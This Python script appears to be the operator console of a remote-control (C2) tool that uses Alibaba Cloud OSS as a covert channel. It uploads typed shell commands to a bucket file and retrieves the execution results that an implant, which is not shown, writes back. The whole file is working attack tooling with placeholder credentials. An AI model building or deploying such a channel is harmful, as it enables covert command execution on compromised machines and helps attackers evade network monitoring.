# -*- coding: utf-8 -*-
# qfmy

import os
import oss2
import time

def ossConfig(ossurl,BucketName,AccessKeyId,AccessKeySecret):

	''' api config of aliyun oss '''
	
	ossurl = ossurl
	BucketName = BucketName
	auth = oss2.Auth(AccessKeyId, AccessKeySecret)
	bucket = oss2.Bucket(auth, ossurl, BucketName)
	return bucket

def putPayload(ossconfigObj,oss_command_file):

	''' upload execute command file to oss '''

	cmdtext = str(input(">>>:"))
	ossconfigObj.put_object(oss_command_file,cmdtext)
	if True:
		print("[+] Command file uploaded")

def downloadExecuteResult(ossconfigObj,execute_result_file):

	''' download Execute Result from oss and look look it '''
	
	download_execute_result_file = str(id(time.ctime))
	ossconfigObj.get_object_to_file(execute_result_file, download_execute_result_file)
	execute_result = open(download_execute_result_file).read()
	
	try:
		execute_result = execute_result
	finally:
		os.remove(download_execute_result_file)

	print(execute_result)

def main():

	''' main '''

	ossconfig = ossConfig(ossurl="<your ossurl>",BucketName="<your BucketName>",AccessKeyId="<your AccessKeyId>",AccessKeySecret="<your AccessKeySecret>")
	server_console = input("1.Run Execute\n2.View results\n[+] Select:")
	if server_console == "1":
		print("[+] 1")
		putPayload(ossconfig,oss_command_file="oss_command_file.txt")
	elif server_console == "2":
		print("[+] 2")
		print("[Tips] Please wait 5s...")
		timeSleep = time.sleep(5)
		downloadExecuteResult(ossconfig,execute_result_file="execute_result.txt")
	else:
		print("[Tips] 1.Run Execute\n2.View results\n")
	

if __name__ == "__main__":
	while True:
		main()
